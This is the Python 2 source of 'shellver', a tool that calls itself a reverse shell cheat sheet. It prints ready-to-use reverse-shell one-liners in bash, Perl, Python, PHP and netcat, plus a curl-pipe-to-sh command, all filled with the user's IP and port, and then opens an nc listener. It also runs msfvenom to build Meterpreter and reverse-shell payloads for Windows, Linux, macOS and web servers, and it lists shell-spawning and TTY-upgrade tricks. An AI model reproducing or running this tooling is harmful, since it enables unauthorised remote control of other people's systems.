#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import sys, os
import socket
from requests import get
from random import choice


def resize():
	os.system("resize -s 33 95")
	os.system("clear")


def shell():
	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
	lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
	wan = get('https://ipapi.co/ip/').text
	print choice(color) + "For lan enter 1:",(lan)
	print choice(color) + "For wan enter 2:",(wan)
	cw = raw_input("Which one do you want lan or wan : ")
        if cw == '1':
		 ipp = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
        if cw == '2':
		 ipp = get('https://ipapi.co/ip/').text
	port = raw_input("Select listening port : ")

	print choice(color) + "					|--Bash TCP--|"
	print "\n"
	print choice(color) + "[+] bash -i >& /dev/tcp/{}/{} 0>&1".format (ipp,port)
	print "\n"
	print choice(color) + "					|--Perl--|"
	print "\n"
	print choice(color) + "[+] perl -e 'use Socket;$i=\"{}\";$p={};socket".format (ipp,port)
	print """(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""	
	print "\n"
	print choice(color) + "					|--Python--|"
	print "\n"
	print choice(color) + "[+] python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")\'".format (ipp,port)
	print "\n"
	print choice(color) + "					|--PHP--|"
	print "\n"
	print choice(color) + "[+] php -r \'$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");\'".format (ipp,port)
	print "\n"
	print choice(color) + "					|--Netcat--|"
	print "\n"
	print choice(color) + "[+] nc -e /bin/sh {} {}".format (ipp,port)
	print "\n"
	print choice(color) + "					|--Curl--|"
	print "\n"
	print choice(color) + "[+] curl -s https://shell.now.sh/{}:{}| sh".format (ipp,port)
	print "\n"
	print choice(color) + "		|--Shell Spawning--|For Details use shellver spawn--|"
	print choice(color) + "[+] python -c \'import pty; pty.spawn(\"/bin/sh\")\' "
	print choice(color) + "[+] perl -e 'exec \"/bin/sh\";\' "
	print choice(color) + "[+] /bin/sh -i "
	print "\n"
	os.system("nc -lvp {}".format(port))
	
def payload():
	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
	    
	ven = raw_input("Enter Payload :")
	lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
	wan = get('https://ipapi.co/ip/').text
	print choice(color) + "For lan enter 1:",(lan)
	print choice(color) + "For wan enter 2:",(wan)
	cw = raw_input("Which one do you want selected Payload lan or wan : ")
        if cw == '1':
		 ipp = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
        if cw == '2':
		 ipp = get('https://ipapi.co/ip/').text
	port = raw_input("Select listening port : ")

	
		#Binaries
        if ven == '1':
        	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > /root/Desktop/shell.elf'.format (ipp,port))
        if ven == '2':
        	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -e x86/shikata_ga_nai -i 20 > /root/Desktop/shell.exe'.format (ipp,port))
        if ven == '3':
        	os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f macho > /root/Desktop/shell.macho'.format (ipp,port))
        #Web Payloads
        if ven == '4':
        	os.system('msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw > /root/Desktop/shell.php'.format (ipp,port))
        if ven == '5':	
        	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f asp > /root/Desktop/shell.asp'.format (ipp,port))
        if ven == '6':	
        	os.system('msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw > /root/Desktop/shell.jsp'.format (ipp,port))
        if ven == '7':	
        	os.system('msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war > /root/Desktop/shell.war'.format (ipp,port))
        if ven == '8':	
        	os.system('msfvenom -p cmd/unix/reverse_nodejs LHOST={} LPORT={} -f war > /root/Desktop/shell.js'.format (ipp,port))
        
        
        #Scrippting Payloads	
        if ven == '9':
        	os.system('msfvenom -p cmd/unix/reverse_python LHOST={} LPORT={} -f raw > /root/Desktop/shell.py'.format (ipp,port))
        if ven == '10':	
        	os.system('msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw > /root/Desktop/shell.sh'.format (ipp,port))
        if ven == '11':	
        	os.system('msfvenom -p cmd/unix/reverse_perl LHOST={} LPORT={} -f raw > /root/Desktop/shell.pl'.format (ipp,port))
        if ven == '12':	
        	os.system('msfvenom -p cmd/unix/reverse_ruby LHOST={} LPORT={} -f raw > /root/Desktop/shell.rb'.format (ipp,port))
        	
        #Shellcode
        if ven == '13':
        	dil = raw_input("Enter Language: ")
        	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} > /root/Desktop/shellcode'.format (ipp,port,dil))
        if ven == '14':
        	dil = raw_input("Enter Language: ")
        	os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} > /root/Desktop/shellcode'.format (ipp,port,dil))
        if ven == '15':
        	dil = raw_input("Enter Language: ")
        	os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f {} > /root/Desktop/shellcode'.format (ipp,port,dil))

	
def banner():

	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']

	print choice(color) + ''' 

				  ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
				  ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
				  ╚═╝┴ ┴└─┘╩═╝╩═╝╚╝ └─┘┴└─

					 .:: 0xR ::.
			    .:: Reverse Shell Cheat Sheet Tool ::.
				   .:: cyber-warrior.org ::. 
\033[0m
	'''




def main(arg):

	
	color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
	resize()
	parser = argparse.ArgumentParser()
	parser.add_argument("use", help="shellver msf or shell or spawn ")
	args = parser.parse_args()
	banner()
	if args.use == "shell":
		shell()
	if args.use == "msf":
		print choice(color) + """         
		______________________________________________________________           
		                                                                                   
				Creating Metasploit Payloads                                              
	 ______________________________________________________________________________    
	|              |                 |                       |                     |   
	| #Binaries    |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |   
	|______________|_________________|_______________________|_____________________|   
	|              |                 |                       |                     |   
	| 1) Linux     | 4) PHP          | 9)  Python            | 13) Linux Based     |   
	|              |                 |                       |                     |   
	| 2) Windows   | 5) ASP          [ 10) Bash              | 14) Windows Based   |   
	|              |                 |                       |                     |   
	| 3) Mac       | 6) JSP          [ 11) Perl              ] 15) Mac Based       |   
	|              |                 |                       |                     |   
	|              | 7) WAR          | 12) Ruby              |                     |   
	|              |                 |                       |                     |   
	|              | 8) Nodejs       |                       |                     |
	|______________|_________________|_______________________|_____________________| 
"""								
		payload()
	
	
	
	if args.use == "spawn":	
		print choice(color) + """
|--Shell Spawning--|
------------
/bin/sh -i
(From an interpreter)

python -c 'import pty; pty.spawn("/bin/sh")'
------------
perl -e 'exec "/bin/sh";'
------------
perl: exec "/bin/sh";
------------
ruby: exec "/bin/sh"
------------
lua: os.execute('/bin/sh')


Access shortcuts, su, nano and autocomplete in a partially tty shell /!\ OhMyZSH might break this trick, a simple sh is recommended
------------
# in host
------------
ctrl+z
stty raw -echo
fg

# in reverse shell
------------
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>


(From within vi)
------------
:!bash
:set shell=/bin/bash:shell


(From within nmap)
------------
!sh"""
	if args.use == "how":	
		print choice(color) + """ run "shellver msf" or "shellver shell" or "shellver spawn" """
		
		
	if args.use != "shell" and args.use != "spawn" and args.use != "msf" and args.use != "how":
		print choice(color) + 'Type "python shell.py -h" or "shell -h" for options'
if __name__ == '__main__':
   main(sys.argv[1:])
exit()
